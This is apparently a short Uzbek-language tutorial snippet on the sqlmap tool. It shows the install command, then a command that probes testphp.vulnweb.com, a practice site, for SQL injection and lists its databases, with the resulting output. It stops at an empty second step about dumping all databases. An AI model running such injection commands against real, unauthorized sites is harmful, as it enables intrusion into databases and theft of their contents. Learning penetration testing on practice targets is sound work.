**SQLMAP**   
```
sudo apt update && sudo apt install sqlmap
```   
1. Veb-saytda SQL Injection bor-yo'qligini aniqlash uchun (Barcha ma'lumotlar bazasini chiqarish):   
```
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --batch --dbs
```
available databases [2]:  
[*] acuart  
[*] information_schema  


2. Barcha ma'lumotlar bazasini chiqarish
